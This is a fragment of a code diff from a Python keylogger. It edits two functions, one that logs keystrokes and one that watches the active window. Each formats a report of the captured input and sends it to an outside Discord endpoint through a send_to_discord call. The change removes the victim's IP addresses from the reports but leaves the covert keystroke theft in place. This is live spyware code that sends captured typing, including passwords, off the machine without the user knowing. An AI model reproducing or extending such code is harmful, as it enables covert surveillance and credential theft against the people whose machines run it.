@@ -91,7 +91,7 @@ def send_keystrokes():
     with keystroke_lock:
         if keystrokes.strip():
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) ({keystroke_app} - {keystroke_window}): {keystrokes}"
+            message = f"[{timestamp}] {PC_NAME} - ({keystroke_app} - {keystroke_window}): {keystrokes}"
             send_to_discord("KEYLOG", message, 16776960)  # Yellow
             keystrokes = ""
             keystroke_app, keystroke_window = "Unknown", "Unknown"
@@ -141,7 +141,7 @@ def monitor():
             new_app_name, new_window_title = get_active_window_title()
             if new_app_name and new_window_title and (new_app_name, new_window_title) != last_logged:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Active Window: {new_app_name} ({new_window_title})"
+                message = f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})"
                 send_to_discord("WINDOW ACTIVE", message, 255)  # Blue
                 last_logged = (new_app_name, new_window_title)
             time.sleep(1)
